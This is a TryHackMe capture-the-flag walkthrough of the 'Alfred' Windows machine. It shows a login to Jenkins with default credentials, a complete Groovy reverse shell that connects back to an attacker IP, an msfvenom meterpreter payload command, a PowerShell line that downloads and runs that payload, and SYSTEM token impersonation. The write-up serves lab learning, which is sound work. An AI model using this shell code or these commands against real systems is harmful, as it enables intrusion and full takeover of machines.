---
layout: solution
category: TryHackMe
contest_code: General
contest_name: General
problem_code: ALFRED
problem_name: Alfred
comments: false
tags: jenkins windows_tokens
date: 2021-08-28
---

### A simple nmap scan was conducted on the machine. Turns out it is running a website on port 80 and 8080. Also running RDP on port 3389

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/nmap.png)

‎


### The website on port 80 does not look interesting enough

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/web1.png)

‎


### The website on port 8080 was found to have a login page. Default `admin:admin` credentials was used to login into the webpage

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/web2.png)

‎


### After logged in as admin, it brought us to this page, where it can be used to manage Jenkins

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/index.png)

‎


### The script page allowed us to execute remote commands in groovy language. This allows us to perform RCE. 

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/command_exec.png)

‎


### A reverse shell groovy script was created and executed to gain a reverse shell
```groovy
String host="10.11.21.149";
int port=9999;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/reverse_shell.png)

<p style="color:orange;">The reverse shell was obtained using Ncat as a listener</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/ncat.png)

<p style="color:orange;">We are able to get our first flag</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/flag1.png)

‎


### It's always good to always to obtain a better shell for higher flexibility. Thus I had attempted to upgrade this simple shell to a meterpreter shell and hosted it on port 80
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.21.149 LPORT=8000 -f exe -o shell.exe
```
<p style="color:orange;">Creating Meterpreter shell</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/msfconsole.png)

<p style="color:orange;">Hosting Payload</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/host.png)

‎


### However, this machine runs on older version of powershell  which does not support `Invoke-WebRequest` library (alternative to wget). Thus, another approach was used to download our meterpreter payload to obtain a meterpreter shell
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.21.149/shell.exe','shell.exe')" && shell.exe
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/download.png)

<p style="color:orange;">Obtaining a reverse meterpreter shell</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/meterpreter_shell.png)

‎


### In order to privilege escalate we can impersonate windows tokens.
### Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
### Thus, we can view all the privileges using `whoami /priv`. We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. We can use the incognito module that will allow us to exploit this vulnerability
```
whoami /priv
```
![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/privilege_list.png)

‎


### We can list user token by using the command `list_tokens -u`. We are able to see that NT Authority\System token is available. We then can proceed impersonating the token by executing `impersonate_token NT AUTHORITY\SYSTEM` to escalate our privilege

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/escalation.png)

‎


### However, even though we have a higher privileged token, we may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 
### To mitigate from this, we can migrate to a process with correct permissions. The safest process to pick is the `services.exe` process.

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Alfred/root.png)
